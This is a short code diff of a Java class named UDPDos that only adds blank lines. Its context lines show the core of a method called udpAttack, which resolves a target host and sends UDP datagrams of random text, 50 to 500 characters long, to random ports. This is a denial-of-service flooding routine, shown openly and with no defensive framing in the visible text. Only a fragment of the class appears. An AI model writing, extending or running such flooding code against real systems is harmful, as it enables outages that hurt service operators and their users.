@@ -26,6 +26,7 @@ public class UDPDos extends Thread {
 
     private void udpAttack(String url) throws Exception {
         InetAddress serveur = InetAddress.getByName(url);
+
         // toSend random String of 50-500 characters
         String toSend = "";
         int lengthToSend = (int) (Math.random() * 450) + 50;
@@ -34,8 +35,10 @@ public class UDPDos extends Thread {
         }
         int length = toSend.length();
         byte buffer[] = toSend.getBytes();
+
         // port random 0-65535
         int port = (int) (Math.random() * 65535);
+        
         DatagramPacket dataSent = new DatagramPacket(buffer, length, serveur, port);
         DatagramSocket socket = new DatagramSocket();
         socket.send(dataSent);
